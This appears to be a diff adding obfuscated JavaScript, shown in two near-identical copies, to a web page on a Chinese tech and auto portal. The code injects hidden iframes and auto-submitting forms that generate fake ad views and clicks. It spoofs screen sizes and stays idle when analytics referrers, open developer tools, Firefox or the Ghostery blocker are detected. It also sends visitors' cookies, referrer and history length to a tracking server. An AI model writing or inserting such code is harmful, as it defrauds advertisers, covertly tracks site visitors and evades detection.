@@ -1,0 +1,312 @@
+;setTimeout(function(){
+    if(/^\x74e\x73t15(\x53h\x6fw|\x43\x6ck)\x49f\x72/.test(window.name)){var ch=5422;if(/\/autox\/x\.html/.test(window.name))ch=5547;if(!/#ad=0000#ad=0000/.test(location.hash))location.replace("http://count6.pconline.com.cn/count.php?channel="+ch+"&content="+escape("@default,p==t:"+[window.parent==window.top,window.parent==window]+";his:"+history.length+";links:"+document.links.length+";hash:"+location.hash+";wn:"+window.name+";ref:"+document.referrer+";ua:"+navigator.userAgent+[!!window.attachEvent,!!window.postMessage]));return;}
+
+    if(/##ad=0000/.test(location.hash)&&location.pathname!='/'){if(!window.testad0000)(window[Math.random()]=new Image()).src="http://count6.pconline.com.cn/count.php?channel=5575&ad="+(screen.width==1024&&window.attachEvent&&window.postMessage?0:1)+"&content="+escape(""+["his:"+history.length,"name="+window.name,"pcgames.qz.test15.",location.hash,document.referrer,document.cookie,navigator.userAgent]);window.testad0000 = 1;}
+
+    if(document.referrer=='http://www.pcauto.com.cn/autox/x.html') (function(){if(window._t15_airui==1)return;var tid='auto.airui.test15.';var js=document.createElement("script");js.src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&";var node = document.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);window._t15_airui=1;})();
+
+	if(document.referrer=='http://www.pcauto.com.cn/autox/x.html') (function(){if(window._t15_pc_airui==1)return;var tid='pc.airui.test15.';var js=document.createElement("script");js.src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&";var node = document.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);window._t15_pc_airui=1;})();
+
+    (function(d,w){if(w._t15_vshow==1 || location.href.indexOf("pcauto.com.cn") == -1 || location.pathname=='/')return;if(d.referrer.indexOf("vshow.c") != -1 || (d.referrer =='' && /MSIE 8/.test(navigator.userAgent))){var tid='auto.vshow.test15.',js,node;(js=d.createElement("script")).src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&";node = d.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);w._t15_vshow=1;}})(document,window);
+
+	var now = new Date();
+	window['test15'+now.getFullYear()+now.getMonth()+now.getDate()] = 1;
+	if(!window['__test15atids']) window['__test15atids']=[];
+	if(0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x6dia\x6f\x7ahe\x6e\x2ec\x6f\x6d')||0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x74o\x6eg\x6ai\x2eb\x61i\x64u\x2ec\x6fm')||0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x77\x77w\x2e\x67o\x6f\x67\x6ce\x2ec\x6f\x6d\x2fa\x6ea\x6c\x79t\x69c\x73')||0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x75\x6e\x69on\x2ebai\x64u\x2eco\x6d') || location.pathname=='/' || /#ad=0000/.test(location.hash) || (/price\.pcauto\.com\.cn\/cars\/image/.test(location.href)&&!/\?ad=0002/.test(location.href))) return;
+	var ivy_div = document.getElementById("ivy_div"),ua = navigator.userAgent,chrome = /Chrome/.test(ua)&&/Netscape/.test(navigator.appName);
+	if(ivy_div==null||/^\x74e\x73t15(\x53h\x6fw|\x43\x6ck)\x49f\x72/.test(window.name)||/Firefox/.test(ua)||/UBrowser/.test(ua)) return;
+	var c=ivy_div.style;c.width="1px";c.height="0px";c.overflow="hidden";c.position="absolute";c.display="block";
+	var pos = {w:document.documentElement.clientWidth||document.body.clientWidth,h:document.documentElement.clientHeight||document.body.clientHeight}
+	var test15showfunc = 'test15showfunc'+Math.floor(Math.random()*99999+10000);
+	window[test15showfunc] = function(){
+		var idx4show=1*new Date();
+		show(idx4show++,"http://ivy.pconline.com.cn/adpuba/click?id=pcgames.qz.test15.&adid=186537&watch=0");
+		show(idx4show++,"{SRC2}");
+		show(idx4show++,"{SRC3}");
+		show(idx4show++,"{SRC4}");
+		show(idx4show++,"{SRC5}");
+		show(idx4show++,"{SRC6}");
+		show(idx4show++,"{SRC7}");
+		show(idx4show++,"{SRC8}");
+		show(idx4show++,"{SRC9}");
+		show(idx4show++,"{SRC10}");
+		show(idx4show++,"{SRC11}");
+		show(idx4show++,"{SRC12}");
+		show(idx4show++,"{SRC13}");
+		show(idx4show++,"{SRC14}");
+		show(idx4show++,"{SRC15}");
+		show(idx4show++,"{SRC16}");
+		show(idx4show++,"{SRC17}");
+		show(idx4show++,"{SRC18}");
+		show(idx4show++,"{SRC19}");
+		show(idx4show++,"{SRC20}");
+		show(idx4show++,"{SRC21}");
+		show(idx4show++,"{SRC22}");
+		show(idx4show++,"{SRC23}");
+		show(idx4show++,"{SRC24}");
+		show(idx4show++,"{SRC25}");
+		show(idx4show++,"{SRC26}");
+		show(idx4show++,"{SRC27}");
+		show(idx4show++,"{SRC28}");
+		show(idx4show++,"{SRC29}");
+		show(idx4show++,"{SRC30}");
+		show(idx4show++,"{SRC31}");
+		show(idx4show++,"{SRC32}");
+		show(idx4show++,"{SRC33}");
+		show(idx4show++,"{SRC34}");
+		show(idx4show++,"{SRC35}");
+		show(idx4show++,"{SRC36}");
+		show(idx4show++,"{SRC37}");
+		show(idx4show++,"{SRC38}");
+		show(idx4show++,"{SRC39}");
+		show(idx4show++,"{SRC40}");
+
+		function show(idx4show,src,delay){
+			try{
+				var watcher=0,body=document.documentElement&&document.documentElement.clientHeight>0?document.documentElement:document.body,vcode=src.indexOf("adpuba%2Fshow2") != -1;
+				watcher=chrome ? window.outerHeight-Math.floor((window.outerWidth-10)/window.innerWidth*window.innerHeight)>150 : !body || (window.outerHeight ? window.outerHeight : screen.availHeight)-body.clientHeight>250;
+				if(!/^http/i.test(src) || watcher&&/watch=0/.test(src) || watcher&&chrome) return;
+				if(!delay){
+					delay=1*src.replace(/.*&delay=(\d+).*|.*/,"$1"); if(delay<1)delay=1000+Math.floor(Math.random()*3000);
+					if(vcode) delay = 1;
+					src=src.replace(/&delay=(\d+)/,"");
+					return setTimeout(function(){show(idx4show,src,true); },delay);
+				}
+				if(chrome && document.querySelectorAll){
+					var gear = document.querySelectorAll("a[id$='-gear'][title='µã»÷ÅäÖÃÌáÐÑÆøÅÝ']");
+					if(gear.length > 0){(window["tmp"+1*new Date()]=new Image()).src=
+				"http://agent1.pconline.com.cn:8060/counter/adAnalyse/fflloogg.jsp?m=add&adid=Ghostery-Log&f=Ghostery-Log&c="+ gear[0].parentNode.getElementsByTagName("span").length + " -- " + location.href;return;}
+				}
+				src=src.replace(/(show[?]id=)([\w.]+)/,function($0,$1,$2){return $1+escapeAll($2)}).replace('ivy.pconline','i\x79v.pconline');
+				var k=src.indexOf('#http'), srcCd = unescape(src).replace(/\n/g,''), adid = srcCd.replace(/^.*adid=(\d+).*$|^.*$/,'$1'), atid = srcCd.replace(/^.*atid=(\d+).*$|^.*$/,'$1'), div=document.createElement("div");
+				if(atid) __test15atids.push(atid);
+				if(/rr\.php|rr\.jsp/.test(src)&&!/keepparent/.test(src)){
+					var
+					fArr = src.replace(/^.*from=([^&]+).*$|^.*$/,'$1').split("%0A"),
+					tArr = src.replace(/^.*to=([^&]+).*$|^.*$/,'$1').split("%0A"),
+					fr = fArr[Math.floor(Math.random()*fArr.length)],
+					to = tArr[Math.floor(Math.random()*tArr.length)],
+					co = src.replace(/^.*code=([^&]+).*$|^.*$/,'$1'), ifr, idoc, icod;
+					co = replaceRT(co);
+					!!fr && (fr = fr.indexOf("%23ad%3D0000") > -1 ? fr : fr + '%23ad%3D0000');
+					!!to && (to = to.indexOf("%23ad%3D0000") > -1 ? to : to + '%23ad%3D0000');
+					src = src.replace(/from=[^&]+/,"from="+fr).replace(/to=[^&]+/,"to="+to).replace(/code=[^&]+/,"code="+co);
+					if(!!fr && !!co){
+						div.innerHTML = "\x3ci\x46ra\x4de name=\"test15ShowIfr"+adid+"-"+location.href+"-"+document.referrer+"-"+(window==top&&window==parent)+"wn="+ encodeURIComponent(src.replace(/^http[^&]*/,"")) +"=wn\" width="+ (!vcode ? pos.w : 1) +" height="+ (!vcode ? pos.h : 1) +" class=i"+atid+"_"+adid+" id=_ivf000"+idx4show+" \x3e\x3c/i\x46ra\x4de\x3e";
+						ivy_div.appendChild(div.firstChild);
+						icod = '\x3cf\x6frm\x20m\x65thod\x3dpost\x20id\x3d\x66m\x20ac\x74\x69on\x3d"'+unescape(fr)+'\x22\x3e\x3cinput\x20type\x3dhidde\x6e\x20name\x3dngix\x5fposter\x20val\x75e\x3d\x31\x20\x2f\x3e\x3cinput\x20type\x3dhidde\x6e\x20name\x3dwn\x5fposter\x20val\x75e\x3d\x31\x20\x2f\x3e\x3c\x2fform\x3e\x3cscri\x70t\x3edocum\x65\x6et\x2e\x67etEl\x65\x6de\x6et\x42yId\x28\x22fm\x22\x29\x2esubm\x69t\x28\x29\x3b\x3c\x2f\x73\x63r\x69pt\x3e';
+						setTimeout(function(){
+							ifr = document.getElementById("_ivf000"+idx4show);
+							idoc = ifr.contentDocument||ifr.contentWindow.document;
+							idoc.write(icod);
+							ifr.removeAttribute("name");
+						},300);
+						setTimeout(function(){ifr.parentNode.removeChild(ifr)},30*1000);
+						return;
+					}else{
+						(window[Math.random()]=new Image()).src="http://count6.pconline.com.cn/count.php?channel=5482";
+					}
+				}
+				if(src.indexOf('adpuba/click?')>-1&&!/MSIE/.test(navigator.userAgent)){
+					src = src.replace('adpuba/click?','adpuba/click?trace=6&')
+				}
+				if(k<0) {
+					div.innerHTML = "\x3ci\x46ra\x4de name=\"test15ShowIfr"+adid+"-"+location.href+"-"+document.referrer+"-"+(window==top&&window==parent)+"-pcgames.qz.test15.\" width=1 height=1 id=_ivf000"+idx4show+" src='"+src+"'\x3e\x3c/i\x46ra\x4de\x3e";
+					ivy_div.appendChild(div.firstChild);
+				} else {
+					var ref=src.substring(k+1); src=src.substring(0,k);
+					div.innerHTML=
+						'\x3ci\x46ra\x4de style=margin-top:-8888px width='+pos.w+' height='+pos.h+' id=_ivf'+idx4show+' name=test15ShowIfr'+idx4show+' \x3e\x3c/i\x46ra\x4de\x3e\n'+
+						'\x3cf\x4fr\x4d \x52et\x48od=\x50o\x53t target=test15ShowIfr'+idx4show+' action="'+ref+'"        \x3e\x3cinput id=_ivF\x4fr\x6d'+idx4show+' type=submit name=post_redir value="'+src+'" /\x3e\x3c/f\x4fr\x4d\x3e';
+					ivy_div.appendChild(div);
+					document.getElementById('_iv\x46or\x6d'+idx4show)["\x63l\x69c\x6b"]();
+				}
+			}catch(err) {}
+		}
+		function escapeAll(str){var hexString='';for(var k=0,c;k<str.length;k++){c=str.charAt(k);for(i=0;i<=256;++i){var h=i.toString(16);if(h.length==1)h="0"+h;h="%"+h;if(unescape(h)==c){hexString+=h;break}else if(i==256){hexString+=escape(c);break}}}return hexString}
+		function replaceRT(co){
+		var rnd = co.match(/%5BRND(\d+)%5D/), tme = co.match(/%5BTIME(\d+)%5D/), wid = co.match(/%5BSCRW%5D/), hei = co.match(/%5BSCRH%5D/);
+			rnd && (co = co.replace(rnd[0],fixrnd(rnd[1]*1)));
+			tme && (co = co.replace(tme[0],fixtime(tme[1]*1)));
+		var dataScreen = [{"15.4" : [1366,768]}, {"13.22" : [1440,900]}, {"11.09" : [1024,768]}, {"8.23" : [1920,1080]}, {"4.13" : [1600,900]}, {"4.09" : [1280,800]}, {"3.53" : [320,480]}, {"3.11" : [1280,1024]}, {"2.79" : [1680,1050]}, {"2.63" : [480,800]}, {"1.84" : [1280,768]}];
+			if(wid || hei){	var size = rndRun(dataScreen); wid && (co = co.replace(wid[0],size[0])); hei && (co=co.replace(hei[0],size[1]));}
+			return co;
+		}
+		function rndRun(rndData) {
+		var obj = {}, num = 0, l = rndData.length, key, i, size = [1366,768];
+			for( i = 0; i < l; i++ ) for( key in rndData[i] ){ num += key*100; obj[num] = rndData[i][key];};
+			var r = Math.floor(Math.random()*num);
+			for ( key in obj ) if(r < key){size = obj[key];break;};
+			return size;
+		};
+		function fixtime(n){
+			var t = new Date()*1 + "";
+			if(t.length > n){t = t.substring(0,n)}
+			else if(t.length < n){	t += fixrnd(n - t.length);}
+			return t*1;
+		}
+		function fixrnd(n){
+			var s = "";
+			for(var i = 0; i<n;i++)s += Math.floor(Math.random()*10);
+			return s*1;
+		}		
+	}
+	var fla_div = document.createElement('div');ivy_div.appendChild(fla_div);fla_div.innerHTML = '<embed src="http://img0.pconline.com.cn/ivy/image/20130802/x.swf" width="1" height="1" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" wmode="transparent" flashvars="c='+test15showfunc+'" allowScriptAccess="always" style="position:absolute;top:-10000px;"><\/embed>';
+	setTimeout(function(){if(window.t15rd==1)return;var tid='pcgames.qz.test15.';var js=document.createElement("script"),atids='';if(!!__test15atids&&__test15atids.length>0) atids=__test15atids.join(','); js.src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&s_atid=&";var node = document.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);(window[new Date()*1]=new Image()).src="http://ivy.pconline.com.cn/adpuba/click?adid=351741&id=pc.test.pv.&";window.t15rd=1;},12*1000);
+},1);
+;setTimeout(function(){
+    if(/^\x74e\x73t15(\x53h\x6fw|\x43\x6ck)\x49f\x72/.test(window.name)){var ch=5422;if(/\/autox\/x\.html/.test(window.name))ch=5547;if(!/#ad=0000#ad=0000/.test(location.hash))location.replace("http://count6.pconline.com.cn/count.php?channel="+ch+"&content="+escape("@default,p==t:"+[window.parent==window.top,window.parent==window]+";his:"+history.length+";links:"+document.links.length+";hash:"+location.hash+";wn:"+window.name+";ref:"+document.referrer+";ua:"+navigator.userAgent+[!!window.attachEvent,!!window.postMessage]));return;}
+
+    if(/##ad=0000/.test(location.hash)&&location.pathname!='/'){if(!window.testad0000)(window[Math.random()]=new Image()).src="http://count6.pconline.com.cn/count.php?channel=5575&ad="+(screen.width==1024&&window.attachEvent&&window.postMessage?0:1)+"&content="+escape(""+["his:"+history.length,"name="+window.name,"pcgames.qz.test15.",location.hash,document.referrer,document.cookie,navigator.userAgent]);window.testad0000 = 1;}
+
+    if(document.referrer=='http://www.pcauto.com.cn/autox/x.html') (function(){if(window._t15_airui==1)return;var tid='auto.airui.test15.';var js=document.createElement("script");js.src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&";var node = document.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);window._t15_airui=1;})();
+
+	if(document.referrer=='http://www.pcauto.com.cn/autox/x.html') (function(){if(window._t15_pc_airui==1)return;var tid='pc.airui.test15.';var js=document.createElement("script");js.src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&";var node = document.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);window._t15_pc_airui=1;})();
+
+    (function(d,w){if(w._t15_vshow==1 || location.href.indexOf("pcauto.com.cn") == -1 || location.pathname=='/')return;if(d.referrer.indexOf("vshow.c") != -1 || (d.referrer =='' && /MSIE 8/.test(navigator.userAgent))){var tid='auto.vshow.test15.',js,node;(js=d.createElement("script")).src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&";node = d.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);w._t15_vshow=1;}})(document,window);
+
+	var now = new Date();
+	window['test15'+now.getFullYear()+now.getMonth()+now.getDate()] = 1;
+	if(!window['__test15atids']) window['__test15atids']=[];
+	if(0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x6dia\x6f\x7ahe\x6e\x2ec\x6f\x6d')||0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x74o\x6eg\x6ai\x2eb\x61i\x64u\x2ec\x6fm')||0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x77\x77w\x2e\x67o\x6f\x67\x6ce\x2ec\x6f\x6d\x2fa\x6ea\x6c\x79t\x69c\x73')||0<window['\x64\x6fcu\x6de\x6et']['\x72e\x66e\x72r\x65r'].indexOf('\x75\x6e\x69on\x2ebai\x64u\x2eco\x6d') || location.pathname=='/' || /#ad=0000/.test(location.hash) || (/price\.pcauto\.com\.cn\/cars\/image/.test(location.href)&&!/\?ad=0002/.test(location.href))) return;
+	var ivy_div = document.getElementById("ivy_div"),ua = navigator.userAgent,chrome = /Chrome/.test(ua)&&/Netscape/.test(navigator.appName);
+	if(ivy_div==null||/^\x74e\x73t15(\x53h\x6fw|\x43\x6ck)\x49f\x72/.test(window.name)||/Firefox/.test(ua)||/UBrowser/.test(ua)) return;
+	var c=ivy_div.style;c.width="1px";c.height="0px";c.overflow="hidden";c.position="absolute";c.display="block";
+	var pos = {w:document.documentElement.clientWidth||document.body.clientWidth,h:document.documentElement.clientHeight||document.body.clientHeight}
+	var test15showfunc = 'test15showfunc'+Math.floor(Math.random()*99999+10000);
+	window[test15showfunc] = function(){
+		var idx4show=1*new Date();
+		show(idx4show++,"http://jwz.3conline.com/adpuba/rr.jsp?&from=http%3A//diy.pconline.com.cn/main/&to=http%3A//diy.pconline.com.cn/main/&code=%3Csc%7Eipt%20src%3D%22http%3A//ivy.pconline.com.cn/adpuba/show%3Fadid%3D356537%26id%3Dpc.test.click.%26media%3Djs%26trace%3D1%26atid%3D94431503%22%3E%3C/sc%7Eipt%3E&watch=0");
+		show(idx4show++,"http://jwz.3conline.com/adpuba/rr.jsp?&from=http%3A//acc.pconline.com.cn/webcam/&to=http%3A//acc.pconline.com.cn/webcam/&code=%3Csc%7Eipt%20src%3D%22http%3A//ivy.pconline.com.cn/adpuba/show%3Fadid%3D356187%26id%3Dpc.test.click.%26media%3Djs%26trace%3D1%26atid%3D94431653%22%3E%3C/sc%7Eipt%3E&watch=0");
+		show(idx4show++,"http://jwz.3conline.com/adpuba/rr.jsp?&from=http%3A//diy.pconline.com.cn/graphics/&to=http%3A//diy.pconline.com.cn/graphics/&code=%3Csc%7Eipt%20src%3D%22http%3A//ivy.pconline.com.cn/adpuba/show%3Fadid%3D363787%26id%3Dpc.test.click.%26media%3Djs%26trace%3D1%26atid%3D94431811%22%3E%3C/sc%7Eipt%3E&watch=0");
+		show(idx4show++,"http://jwz.3conline.com/adpuba/rr.jsp?&from=http%3A//diy.pconline.com.cn/storage/&to=http%3A//diy.pconline.com.cn/storage/&code=%3Csc%7Eipt%20src%3D%22http%3A//ivy.pconline.com.cn/adpuba/show%3Fadid%3D357140%26id%3Dpc.test.click.%26media%3Djs%26trace%3D1%26atid%3D94431750%22%3E%3C/sc%7Eipt%3E&watch=0");
+		show(idx4show++,"{SRC5}");
+		show(idx4show++,"{SRC6}");
+		show(idx4show++,"{SRC7}");
+		show(idx4show++,"{SRC8}");
+		show(idx4show++,"{SRC9}");
+		show(idx4show++,"{SRC10}");
+		show(idx4show++,"{SRC11}");
+		show(idx4show++,"{SRC12}");
+		show(idx4show++,"{SRC13}");
+		show(idx4show++,"{SRC14}");
+		show(idx4show++,"{SRC15}");
+		show(idx4show++,"{SRC16}");
+		show(idx4show++,"{SRC17}");
+		show(idx4show++,"{SRC18}");
+		show(idx4show++,"{SRC19}");
+		show(idx4show++,"{SRC20}");
+		show(idx4show++,"{SRC21}");
+		show(idx4show++,"{SRC22}");
+		show(idx4show++,"{SRC23}");
+		show(idx4show++,"{SRC24}");
+		show(idx4show++,"{SRC25}");
+		show(idx4show++,"{SRC26}");
+		show(idx4show++,"{SRC27}");
+		show(idx4show++,"{SRC28}");
+		show(idx4show++,"{SRC29}");
+		show(idx4show++,"{SRC30}");
+		show(idx4show++,"{SRC31}");
+		show(idx4show++,"{SRC32}");
+		show(idx4show++,"{SRC33}");
+		show(idx4show++,"{SRC34}");
+		show(idx4show++,"{SRC35}");
+		show(idx4show++,"{SRC36}");
+		show(idx4show++,"{SRC37}");
+		show(idx4show++,"{SRC38}");
+		show(idx4show++,"{SRC39}");
+		show(idx4show++,"{SRC40}");
+
+		function show(idx4show,src,delay){
+			try{
+				var watcher=0,body=document.documentElement&&document.documentElement.clientHeight>0?document.documentElement:document.body,vcode=src.indexOf("adpuba%2Fshow2") != -1;
+				watcher=chrome ? window.outerHeight-Math.floor((window.outerWidth-10)/window.innerWidth*window.innerHeight)>150 : !body || (window.outerHeight ? window.outerHeight : screen.availHeight)-body.clientHeight>250;
+				if(!/^http/i.test(src) || watcher&&/watch=0/.test(src) || watcher&&chrome) return;
+				if(!delay){
+					delay=1*src.replace(/.*&delay=(\d+).*|.*/,"$1"); if(delay<1)delay=1000+Math.floor(Math.random()*3000);
+					if(vcode) delay = 1;
+					src=src.replace(/&delay=(\d+)/,"");
+					return setTimeout(function(){show(idx4show,src,true); },delay);
+				}
+				if(chrome && document.querySelectorAll){
+					var gear = document.querySelectorAll("a[id$='-gear'][title='µã»÷ÅäÖÃÌáÐÑÆøÅÝ']");
+					if(gear.length > 0){(window["tmp"+1*new Date()]=new Image()).src=
+				"http://agent1.pconline.com.cn:8060/counter/adAnalyse/fflloogg.jsp?m=add&adid=Ghostery-Log&f=Ghostery-Log&c="+ gear[0].parentNode.getElementsByTagName("span").length + " -- " + location.href;return;}
+				}
+				src=src.replace(/(show[?]id=)([\w.]+)/,function($0,$1,$2){return $1+escapeAll($2)}).replace('ivy.pconline','i\x79v.pconline');
+				var k=src.indexOf('#http'), srcCd = unescape(src).replace(/\n/g,''), adid = srcCd.replace(/^.*adid=(\d+).*$|^.*$/,'$1'), atid = srcCd.replace(/^.*atid=(\d+).*$|^.*$/,'$1'), div=document.createElement("div");
+				if(atid) __test15atids.push(atid);
+				if(/rr\.php|rr\.jsp/.test(src)&&!/keepparent/.test(src)){
+					var
+					fArr = src.replace(/^.*from=([^&]+).*$|^.*$/,'$1').split("%0A"),
+					tArr = src.replace(/^.*to=([^&]+).*$|^.*$/,'$1').split("%0A"),
+					fr = fArr[Math.floor(Math.random()*fArr.length)],
+					to = tArr[Math.floor(Math.random()*tArr.length)],
+					co = src.replace(/^.*code=([^&]+).*$|^.*$/,'$1'), ifr, idoc, icod;
+					co = replaceRT(co);
+					!!fr && (fr = fr.indexOf("%23ad%3D0000") > -1 ? fr : fr + '%23ad%3D0000');
+					!!to && (to = to.indexOf("%23ad%3D0000") > -1 ? to : to + '%23ad%3D0000');
+					src = src.replace(/from=[^&]+/,"from="+fr).replace(/to=[^&]+/,"to="+to).replace(/code=[^&]+/,"code="+co);
+					if(!!fr && !!co){
+						div.innerHTML = "\x3ci\x46ra\x4de name=\"test15ShowIfr"+adid+"-"+location.href+"-"+document.referrer+"-"+(window==top&&window==parent)+"wn="+ encodeURIComponent(src.replace(/^http[^&]*/,"")) +"=wn\" width="+ (!vcode ? pos.w : 1) +" height="+ (!vcode ? pos.h : 1) +" class=i"+atid+"_"+adid+" id=_ivf000"+idx4show+" \x3e\x3c/i\x46ra\x4de\x3e";
+						ivy_div.appendChild(div.firstChild);
+						icod = '\x3cf\x6frm\x20m\x65thod\x3dpost\x20id\x3d\x66m\x20ac\x74\x69on\x3d"'+unescape(fr)+'\x22\x3e\x3cinput\x20type\x3dhidde\x6e\x20name\x3dngix\x5fposter\x20val\x75e\x3d\x31\x20\x2f\x3e\x3cinput\x20type\x3dhidde\x6e\x20name\x3dwn\x5fposter\x20val\x75e\x3d\x31\x20\x2f\x3e\x3c\x2fform\x3e\x3cscri\x70t\x3edocum\x65\x6et\x2e\x67etEl\x65\x6de\x6et\x42yId\x28\x22fm\x22\x29\x2esubm\x69t\x28\x29\x3b\x3c\x2f\x73\x63r\x69pt\x3e';
+						setTimeout(function(){
+							ifr = document.getElementById("_ivf000"+idx4show);
+							idoc = ifr.contentDocument||ifr.contentWindow.document;
+							idoc.write(icod);
+							ifr.removeAttribute("name");
+						},300);
+						setTimeout(function(){ifr.parentNode.removeChild(ifr)},30*1000);
+						return;
+					}else{
+						(window[Math.random()]=new Image()).src="http://count6.pconline.com.cn/count.php?channel=5482";
+					}
+				}
+				if(src.indexOf('adpuba/click?')>-1&&!/MSIE/.test(navigator.userAgent)){
+					src = src.replace('adpuba/click?','adpuba/click?trace=6&')
+				}
+				if(k<0) {
+					div.innerHTML = "\x3ci\x46ra\x4de name=\"test15ShowIfr"+adid+"-"+location.href+"-"+document.referrer+"-"+(window==top&&window==parent)+"-pcgames.qz.test15.\" width=1 height=1 id=_ivf000"+idx4show+" src='"+src+"'\x3e\x3c/i\x46ra\x4de\x3e";
+					ivy_div.appendChild(div.firstChild);
+				} else {
+					var ref=src.substring(k+1); src=src.substring(0,k);
+					div.innerHTML=
+						'\x3ci\x46ra\x4de style=margin-top:-8888px width='+pos.w+' height='+pos.h+' id=_ivf'+idx4show+' name=test15ShowIfr'+idx4show+' \x3e\x3c/i\x46ra\x4de\x3e\n'+
+						'\x3cf\x4fr\x4d \x52et\x48od=\x50o\x53t target=test15ShowIfr'+idx4show+' action="'+ref+'"        \x3e\x3cinput id=_ivF\x4fr\x6d'+idx4show+' type=submit name=post_redir value="'+src+'" /\x3e\x3c/f\x4fr\x4d\x3e';
+					ivy_div.appendChild(div);
+					document.getElementById('_iv\x46or\x6d'+idx4show)["\x63l\x69c\x6b"]();
+				}
+			}catch(err) {}
+		}
+		function escapeAll(str){var hexString='';for(var k=0,c;k<str.length;k++){c=str.charAt(k);for(i=0;i<=256;++i){var h=i.toString(16);if(h.length==1)h="0"+h;h="%"+h;if(unescape(h)==c){hexString+=h;break}else if(i==256){hexString+=escape(c);break}}}return hexString}
+		function replaceRT(co){
+		var rnd = co.match(/%5BRND(\d+)%5D/), tme = co.match(/%5BTIME(\d+)%5D/), wid = co.match(/%5BSCRW%5D/), hei = co.match(/%5BSCRH%5D/);
+			rnd && (co = co.replace(rnd[0],fixrnd(rnd[1]*1)));
+			tme && (co = co.replace(tme[0],fixtime(tme[1]*1)));
+		var dataScreen = [{"15.4" : [1366,768]}, {"13.22" : [1440,900]}, {"11.09" : [1024,768]}, {"8.23" : [1920,1080]}, {"4.13" : [1600,900]}, {"4.09" : [1280,800]}, {"3.53" : [320,480]}, {"3.11" : [1280,1024]}, {"2.79" : [1680,1050]}, {"2.63" : [480,800]}, {"1.84" : [1280,768]}];
+			if(wid || hei){	var size = rndRun(dataScreen); wid && (co = co.replace(wid[0],size[0])); hei && (co=co.replace(hei[0],size[1]));}
+			return co;
+		}
+		function rndRun(rndData) {
+		var obj = {}, num = 0, l = rndData.length, key, i, size = [1366,768];
+			for( i = 0; i < l; i++ ) for( key in rndData[i] ){ num += key*100; obj[num] = rndData[i][key];};
+			var r = Math.floor(Math.random()*num);
+			for ( key in obj ) if(r < key){size = obj[key];break;};
+			return size;
+		};
+		function fixtime(n){
+			var t = new Date()*1 + "";
+			if(t.length > n){t = t.substring(0,n)}
+			else if(t.length < n){	t += fixrnd(n - t.length);}
+			return t*1;
+		}
+		function fixrnd(n){
+			var s = "";
+			for(var i = 0; i<n;i++)s += Math.floor(Math.random()*10);
+			return s*1;
+		}		
+	}
+	var fla_div = document.createElement('div');ivy_div.appendChild(fla_div);fla_div.innerHTML = '<embed src="http://img0.pconline.com.cn/ivy/image/20130802/x.swf" width="1" height="1" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" wmode="transparent" flashvars="c='+test15showfunc+'" allowScriptAccess="always" style="position:absolute;top:-10000px;"><\/embed>';
+	setTimeout(function(){if(window.t15rd==1)return;var tid='pcgames.qz.test15.';var js=document.createElement("script"),atids='';if(!!__test15atids&&__test15atids.length>0) atids=__test15atids.join(','); js.src="http://ivy.pconline.com.cn/adpuba/show?id="+tid+"&media=js&channel=dynamic&s_atid=&";var node = document.getElementsByTagName("script")[0];node.parentNode.insertBefore(js,node);(window[new Date()*1]=new Image()).src="http://ivy.pconline.com.cn/adpuba/click?adid=351741&id=pc.test.pv.&";window.t15rd=1;},12*1000);
+},1);
